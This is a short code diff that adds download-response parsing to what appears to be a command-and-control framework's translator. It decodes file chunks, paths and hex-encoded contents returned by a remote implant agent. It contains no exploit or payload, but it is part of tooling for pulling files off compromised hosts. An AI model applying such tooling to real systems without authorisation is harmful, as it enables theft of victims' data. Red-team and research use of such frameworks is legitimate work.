@@ -396,7 +396,27 @@ def process_delegates(TaskUUID, Message, Psr:Parser):
 
 def process_normal_task(TaskUUID, CommandID, TaskPsr:Parser):
     if   CommandID == T_DOWNLOAD:
-        return {"task_id": TaskUUID, "download": {...}}
+        # Parse download response from agent
+        try:
+            current_chunk = TaskPsr.Int32()
+            file_id = TaskPsr.Str()
+            file_path = TaskPsr.Str()
+            chunk_size = TaskPsr.Int32()
+            file_data = TaskPsr.All()  # Get remaining bytes as file content
+            
+            return {
+                "task_id": TaskUUID, 
+                "download": {
+                    "chunk_size": chunk_size,
+                    "file_id": file_id,
+                    "chunk_num": current_chunk,
+                    "full_path": file_path,
+                    "data": file_data.hex() if file_data else ""
+                }
+            }
+        except Exception as e:
+            Dbg2(f"Error parsing download response: {str(e)}")
+            return {"task_id": TaskUUID, "user_output": f"Failed to parse download response: {str(e)}", "completed": True}
     elif CommandID == T_UPLOAD:
         print(TaskPsr.buffer)
         current_chunk = TaskPsr.Int32()
